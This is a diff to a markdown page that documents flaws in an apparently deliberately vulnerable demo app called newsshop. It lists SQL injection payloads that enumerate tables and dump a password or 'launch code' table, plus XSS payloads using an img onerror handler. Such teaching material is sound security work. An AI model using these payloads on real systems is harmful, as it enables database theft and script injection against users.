@@ -9,9 +9,9 @@ newsshop
     ```
     ' or 1=1 UNION SELECT 0,false, 'alle','',GROUP_CONCAT(TABLE_NAME SEPARATOR ', '),'' FROM INFORMATION_SCHEMA.TABLES;--
     ```
-  * in a second step he may read the contents of `PASSWORD`
+  * in a second step he may read the contents of `LAUNCH_CODE`
     ```
-    ' or 1=1 UNION SELECT 0,false, 'passwörter','',GROUP_CONCAT(PASSWORD SEPARATOR ', '),'' FROM PASSWORD;--
+    ' or 1=1 UNION SELECT 0,false, 'Abschusscodes','',GROUP_CONCAT(CONCAT(DEVICE, ':', LAUNCH_CODE) SEPARATOR ', '),'' FROM LAUNCH_CODE;--
     ```
 
 ### Cross Site Scripting
@@ -19,6 +19,12 @@ newsshop
   ```
   <img src="a" onerror="alert('hacked')" />
   ```
+	or
+  ```
+  <img src="a" onerror="alert('sending this text to my domain:\n' + document.body.innerText)" />
+  ```
+  
+  
 ### Legacy attributes in API
 * the newsletter support more attributes than the newsletter form
   * the field `mailProperties` may be filled with JSON/HTML by using a rest client/or browser tools
